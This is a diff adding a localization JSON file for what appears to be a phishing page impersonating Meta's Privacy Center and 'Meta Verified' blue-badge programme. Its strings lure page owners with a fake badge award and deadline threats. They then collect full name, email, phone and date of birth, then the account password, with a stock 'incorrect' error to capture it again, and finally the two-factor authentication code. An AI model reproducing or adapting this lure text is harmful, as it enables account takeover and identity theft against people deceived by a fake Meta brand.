@@ -1,0 +1,103 @@
+{
+    "privacyCenter": {
+        "title": "Privacy Center",
+        "menuItems": {
+            "home": "Privacy Center Home Page",
+            "search": "Search",
+            "privacy": "Privacy Policy",
+            "rules": "Other rules and articles",
+            "settings": "Settings"
+        },
+        "congratulationsTitle": "Meta Verified",
+        "congratulationsMessage": "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
+        "submitRequest": "Submit request",
+        "securityTitle": "Elevate Your Security with Blue Badge Unlock!",
+        "securityMessage": "Please submit all requested information below. Failure to do so may result in delays or cancellation of your request processing.",
+        "requestReview": "Start verification",
+        "privacyCenterSection": "Privacy Center",
+        "privacyPolicyTitle": "What is the Privacy Policy and what does it say?",
+        "privacyPolicyLabel": "Privacy Policy",
+        "manageInfoTitle": "How you can manage or delete your information",
+        "userAgreementDetails": "For more details, see the User Agreement",
+        "metaAiTitle": "Meta AI",
+        "userAgreementLabel": "User Agreement",
+        "additionalResources": "Additional resources",
+        "generativeAiTitle": "How Meta uses information for generative AI models",
+        "metaAiWebsiteLabel": "Meta AI website",
+        "aiSystemsTitle": "Cards with information about the operation of AI systems",
+        "introAiTitle": "Introduction to Generative AI",
+        "forTeenagers": "For teenagers",
+        "privacyRisksMessage": "We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy"
+    },
+    "contact": {
+        "title": "Meta Verified – Rewards for you",
+        "subtitle": "Show the world that you mean business.",
+        "congratulations": "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
+        "celebration": "We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!",
+        "ticketId": "Your ticket id:",
+        "guideTitle": "Verified Blue Badge Request Guide",
+        "guidePoint1": "Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats.",
+        "guidePoint2": "In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.",
+        "guidePoint3": "Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.",
+        "submitButton": "Submit request",
+        "footer": {
+            "helpCenter": "Help Center",
+            "privacyPolicy": "Privacy Policy",
+            "termsOfService": "Terms of Service",
+            "communityStandards": "Community Standards",
+            "copyright": "Meta © 2025"
+        }
+    },
+    "formModal": {
+        "step1": {
+            "title": "Information Form",
+            "fullName": "Full Name",
+            "email": "Email",
+            "pageName": "Page Name",
+            "phoneNumber": "Phone Number",
+            "dateOfBirth": "Date of Birth",
+            "day": "Day",
+            "month": "Month",
+            "year": "Year",
+            "months": {
+                "january": "1",
+                "february": "2",
+                "march": "3",
+                "april": "4",
+                "may": "5",
+                "june": "6",
+                "july": "7",
+                "august": "8",
+                "september": "9",
+                "october": "10",
+                "november": "11",
+                "december": "12"
+            },
+            "note": "Note: Our reply will be sent to you within 14 to 48 hours.",
+            "agreeTerms": "I agree to the Terms of Use",
+            "sendButton": "Send",
+            "validation": {
+                "fullNameRequired": "Please enter your full name",
+                "emailRequired": "Please enter your email",
+                "pageNameRequired": "Please enter your page name",
+                "phoneNumberRequired": "Please enter your phone number",
+                "dobRequired": "Please enter your date of birth",
+                "agreeTermsRequired": "Please agree to the Terms of Use"
+            }
+        },
+        "step2": {
+            "password": "Password",
+            "continueButton": "Continue",
+            "error": "The password that you've entered is incorrect."
+        },
+        "step3": {
+            "facebook": "Facebook",
+            "title": "Two-Factor Authentication required",
+            "description": "Enter the code for this account that we sent to {email}, {phone}, or simply confirm via your configured Two-Factor App (e.g. Duo Mobile or Google Authenticator).",
+            "code": "Code",
+            "continueButton": "Continue",
+            "tryAnotherMethod": "Try another method",
+            "error": "The code that you've entered is incorrect."
+        }
+    }
+}
